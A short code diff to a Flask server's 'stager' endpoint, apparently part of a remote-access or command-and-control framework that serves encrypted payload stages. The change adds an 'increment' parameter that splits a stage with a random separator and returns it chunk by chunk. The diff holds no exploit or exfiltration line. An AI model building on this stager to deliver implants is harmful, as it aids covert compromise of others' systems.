@@ -2,6 +2,8 @@ from base64 import b64encode
 import binascii
 import logging
 import os
+import random
+import string
 
 from flask import render_template, request, Response, Flask
 
@@ -121,6 +123,11 @@ def stager():
     kex = get_param_value('kex')
     natural = get_param_value('natural')
     transport = get_param_value('transport')
+    increment = request.args.get('increment')
+    if increment:
+        separator = '<#%s#>' % random.choices(string.ascii_letters, k=32)
+    else:
+        separator = ''
 
     key = hidden_app.key
 
@@ -132,6 +139,7 @@ def stager():
         DH_G=DH_G,
         DH_MODULUS=DH_MODULUS,
         dh_endpoint=DH_ENDPOINT,
+        separator=separator,
     )
 
     result = get_stage(
@@ -141,6 +149,9 @@ def stager():
         debug=(log.getEffectiveLevel() <= logging.DEBUG),
         natural=natural,
     )
+
+    if increment:
+        result = result.split(separator)[int(increment)]
 
     return Response(result, content_type='text/plain; charset=utf-8')
 
